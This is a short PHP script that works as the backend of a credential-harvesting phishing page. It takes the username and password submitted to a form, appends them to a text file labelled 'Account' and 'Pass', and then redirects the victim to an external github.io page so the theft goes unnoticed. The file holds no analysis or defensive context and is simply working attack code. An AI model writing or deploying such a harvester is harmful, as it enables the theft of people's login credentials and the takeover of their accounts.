<?php

file_put_contents("special.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://crezak.github.io/code.html');
exit();
